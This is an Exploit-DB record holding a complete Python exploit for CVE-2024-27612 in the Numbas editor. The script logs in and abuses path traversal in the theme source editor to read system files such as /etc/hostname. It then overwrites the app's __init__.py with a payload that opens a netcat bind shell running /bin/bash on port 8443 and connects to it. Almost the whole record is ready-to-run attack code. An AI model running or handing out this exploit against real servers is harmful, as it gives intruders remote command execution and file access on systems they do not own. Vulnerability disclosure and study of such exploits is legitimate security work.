{"source": "https://www.exploit-db.com/exploits/51867", "vulnName": "Numbas < v7.3 - Remote Code Execution", "vulnEDBID": "51867", "vulnCVE": "2024-27612", "author": "MATHEUS ALEXANDRE", "exploitType": "WEBAPPS", "platform": "NODEJS", "datePublished": "2024-03-10", "vulnContent": "# Exploit Title: Numbas < v7.3 - Remote Code Execution\n# Google Dork: N/A\n# Date: March 7th, 2024\n# Exploit Author: Matheus Boschetti\n# Vendor Homepage: https://www.numbas.org.uk/\n# Software Link: https://github.com/numbas/Numbas\n# Version: 7.2 and below\n# Tested on: Linux\n# CVE: CVE-2024-27612\n\nimport sys, requests, re, argparse, subprocess, time\nfrom bs4 import BeautifulSoup\n\ns = requests.session()\n\ndef getCSRF(target):\n    url = f\"http://{target}/\"\n    req = s.get(url)\n    soup = BeautifulSoup(req.text, 'html.parser')\n    csrfmiddlewaretoken = soup.find('input', attrs={'name': 'csrfmiddlewaretoken'})['value']\n    return csrfmiddlewaretoken\n\ndef createTheme(target):\n    # Format request\n    csrfmiddlewaretoken = getCSRF(target)\n    theme = 'ExampleTheme'\n    boundary = '----WebKitFormBoundaryKUMXsLP31HzARUV1'\n    data = (\n        f'--{boundary}\\r\\n'\n        'Content-Disposition: form-data; name=\"csrfmiddlewaretoken\"\\r\\n'\n        '\\r\\n'\n        f'{csrfmiddlewaretoken}\\r\\n'\n        f'--{boundary}\\r\\n'\n        'Content-Disposition: form-data; name=\"name\"\\r\\n'\n        '\\r\\n'\n        f'{theme}\\r\\n'\n        f'--{boundary}--\\r\\n'\n    )\n    headers = {'Content-Type': f'multipart/form-data; boundary={boundary}',\n               'User-Agent': 'Mozilla/5.0',\n               'Accept': '*/*',\n               'Connection': 'close'}\n\n    # Create theme and return its ID\n    req = s.post(f\"http://{target}/theme/new/\", headers=headers, data=data)\n    redir = req.url\n    split = redir.split('/')\n    id = split[4]\n    print(f\"\\t[i] Theme created with ID {id}\")\n    return id\n\ndef login(target, user, passwd):\n    print(\"\\n[i] Attempting to login...\")\n\n    csrfmiddlewaretoken = getCSRF(target)\n    data = {'csrfmiddlewaretoken': csrfmiddlewaretoken,\n            'username': user,\n            'password': passwd,\n            'next': '/'}\n    \n    # Login\n    login = s.post(f\"http://{target}/login/\", data=data, allow_redirects=True)\n    res = login.text\n    if(\"Logged in as\" not in res):\n        print(\"\\n\\n[!] Login failed!\")\n        sys.exit(-1)\n\n    # Check if logged and fetch ID\n    usermatch = re.search(r'Logged in as <strong>(.*?)</strong>', res)\n    if usermatch:\n        user = usermatch.group(1)\n        idmatch = re.search(r'<a href=\"/accounts/profile/(.*?)/\"><span class=\"glyphicon glyphicon-user\">', res)\n        if idmatch:\n            id = idmatch.group(1)\n            print(f\"\\t[+] Logged in as \\\"{user}\\\" with ID {id}\")\n\ndef checkVuln(url):\n    print(\"[i] Checking if target is vulnerable...\")\n\n    # Attempt to read files\n    themeID = createTheme(url)\n    target = f\"http://{url}/themes/{themeID}/edit_source?filename=../../../../../../../../../..\"\n    hname = s.get(f\"{target}/etc/hostname\")\n    ver = s.get(f\"{target}/etc/issue\")\n    hnamesoup = BeautifulSoup(hname.text, 'html.parser')\n    versoup = BeautifulSoup(ver.text, 'html.parser')\n    hostname = hnamesoup.find('textarea').get_text().strip()\n    version = versoup.find('textarea').get_text().strip()\n    if len(hostname) < 1:\n        print(\"\\n\\n[!] Something went wrong - target might not be vulnerable.\")\n        sys.exit(-1)\n    print(f\"\\n[+] Target \\\"{hostname}\\\" is vulnerable!\")\n    print(f\"\\t[i] Running: \\\"{version}\\\"\")\n\n    # Cleanup - delete theme\n    print(f\"\\t\\t[i] Cleanup: deleting theme {themeID}...\")\n    target = f\"http://{url}/themes/{themeID}/delete\"\n    csrfmiddlewaretoken = getCSRF(url)\n    data = {'csrfmiddlewaretoken':csrfmiddlewaretoken}\n    s.post(target, data=data)\n\n\ndef replaceInit(target):\n    # Overwrite __init__.py with arbitrary code\n    rport = '8443'\n    payload = f\"import subprocess;subprocess.Popen(['nc','-lnvp','{rport}','-e','/bin/bash'])\"\n    csrfmiddlewaretoken = getCSRF(target)\n    filename = '../../../../numbas_editor/numbas/__init__.py'\n    themeID = createTheme(target)\n    data = {'csrfmiddlewaretoken': csrfmiddlewaretoken,\n            'source': payload,\n            'filename': filename}\n\n    print(\"[i] Delivering payload...\")\n    # Retry 5 times in case something goes wrong...\n    for attempt in range(5):\n        try:\n            s.post(f\"http://{target}/themes/{themeID}/edit_source\", data=data, timeout=10)\n        except Exception as e:\n            pass\n    \n    # Establish connection to bind shell\n    time.sleep(2)\n    print(f\"\\t[+] Payload delivered, establishing connection...\\n\")\n    if \":\" in target:\n        split = target.split(\":\")\n        ip = split[0]\n    else:\n        ip = str(target)\n    subprocess.Popen([\"nc\", \"-n\", ip, rport])\n    while True:\n        pass\n\n\ndef main():\n    parser = argparse.ArgumentParser()\n    if len(sys.argv) <= 1:\n        print(\"\\n[!] No option provided!\")\n        print(\"\\t- check: Passively check if the target is vulnerable by attempting to read files from disk\\n\\t- exploit: Attempt to actively exploit the target\\n\")\n        print(f\"[i] Usage: python3 {sys.argv[0]} <option> --target 172.16.1.5:80 --user example --passwd qwerty\")\n        sys.exit(-1)\n\n    group = parser.add_mutually_exclusive_group(required=True)\n    group.add_argument('action', nargs='?', choices=['check', 'exploit'], help='Action to perform: check or exploit')\n    parser.add_argument('--target', help='Target IP:PORT')\n    parser.add_argument('--user', help='Username to authenticate')\n    parser.add_argument('--passwd', help='Password to authenticate')\n    args = parser.parse_args()\n    action = args.action\n    target = args.target\n    user = args.user\n    passwd = args.passwd\n\n    print(\"\\n\\t\\t-==[ CVE-2024-27612: Numbas Remote Code Execution (RCE) ]==-\")\n    \n    if action == 'check':\n        login(target, user, passwd)\n        checkVuln(target)\n    elif action == 'exploit':\n        login(target, user, passwd)\n        replaceInit(target)\n    else:\n        sys.exit(-1)\n\n\nif __name__ == \"__main__\":\n    main()\n            "}